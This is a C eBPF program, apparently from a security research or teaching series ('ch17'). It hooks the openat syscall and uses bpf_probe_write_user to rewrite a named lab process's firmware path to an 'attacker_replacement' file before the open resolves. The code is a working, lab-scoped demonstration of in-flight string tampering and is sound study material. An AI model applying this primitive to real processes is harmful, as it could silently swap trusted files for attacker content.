// ch17 ACPI / WSMI ANALOG
// ---------------------------------------------------------------------------
// DISCLAIMER: Real ACPI method evaluation (acpi_evaluate_object /
// request_firmware) does not fire on this kernel — no drivers call those
// paths, no test_firmware module is loaded. This analog reproduces the
// *primitive shape* ("kernel-mediated string content substituted in flight")
// against a userspace "firmware requester" whose openat() path argument we
// rewrite via bpf_probe_write_user before the syscall body runs.
//
// This is NOT an ACPI exploit. It demonstrates the motion: intercept the
// call that carries a string chosen by a trusted component, rewrite that
// string before the side-effect (file open) resolves.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define PATH_SCAN_LEN 96

// Expected path: "/tmp/CH17_REQ_real_firmware.bin" — 31 bytes.
// Replacement:   "/tmp/CH17_REQ_attacker_replacement.bin" — 38 bytes.
// The requester allocates a 256-byte buffer so the longer replacement fits.
#define ORIG_PATH "/tmp/CH17_REQ_real_firmware.bin"
#define REPL_PATH "/tmp/CH17_REQ_attacker_replacement.bin"
#define ORIG_LEN  31   // strlen(ORIG_PATH)
#define REPL_LEN  38   // strlen(REPL_PATH)

struct evt {
    unsigned int pid;
    unsigned int tgid;
    char         comm[16];
    int          swapped;
    int          matched;
    char         orig[PATH_SCAN_LEN];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

// Per-cpu scratch keeps the big event off the BPF stack.
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __type(key, unsigned int);
    __type(value, struct evt);
    __uint(max_entries, 1);
} scratch SEC(".maps");

static __always_inline int streq_origpath(const char *s)
{
    // Compare s to ORIG_PATH (31 bytes + NUL at pos 31).
    // Use a bounded loop with an explicit expected table to avoid the
    // compiler spilling a long && chain across the BPF stack.
    static const char expect[32] = ORIG_PATH; // 31 bytes + trailing NUL
    int diff = 0;
    #pragma unroll
    for (int i = 0; i < 32; i++) {
        diff |= (int)((unsigned char)s[i] ^ (unsigned char)expect[i]);
    }
    return diff == 0;
}

static __always_inline int comm_is_fw_requester(const char *c)
{
    static const char expect[13] = "fw_requester"; // 12 chars + NUL
    int diff = 0;
    #pragma unroll
    for (int i = 0; i < 13; i++) {
        diff |= (int)((unsigned char)c[i] ^ (unsigned char)expect[i]);
    }
    return diff == 0;
}

SEC("tp/syscalls/sys_enter_openat")
int tp_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    unsigned long user_path = (unsigned long)ctx->args[1];
    if (!user_path) return 0;

    // Filter to our requester by comm.
    char comm[16] = {};
    bpf_get_current_comm(&comm, sizeof(comm));
    if (!comm_is_fw_requester(comm)) return 0;

    unsigned int zero = 0;
    struct evt *e = bpf_map_lookup_elem(&scratch, &zero);
    if (!e) return 0;

    // Clear once then read the user path.
    __builtin_memset(e, 0, sizeof(*e));
    long n = bpf_probe_read_user_str(&e->orig, sizeof(e->orig),
                                     (const void *)user_path);
    if (n <= 0) return 0;

    if (!streq_origpath(e->orig))
        return 0;

    e->matched = 1;

    // Rewrite: write REPL_PATH + trailing NUL (39 bytes total) into the
    // user's buffer at offset 0. The buffer is 256 bytes so this fits.
    static const char repl[] = REPL_PATH;   // includes NUL
    long rc = bpf_probe_write_user((void *)user_path,
                                   repl, sizeof(repl));
    e->swapped = (rc == 0);

    unsigned long long id = bpf_get_current_pid_tgid();
    e->pid  = (unsigned int)(id & 0xffffffff);
    e->tgid = (unsigned int)(id >> 32);
    __builtin_memcpy(e->comm, comm, sizeof(e->comm));

    struct evt *ev = bpf_ringbuf_reserve(&events, sizeof(*ev), 0);
    if (ev) {
        __builtin_memcpy(ev, e, sizeof(*ev));
        bpf_ringbuf_submit(ev, 0);
    }
    return 0;
}
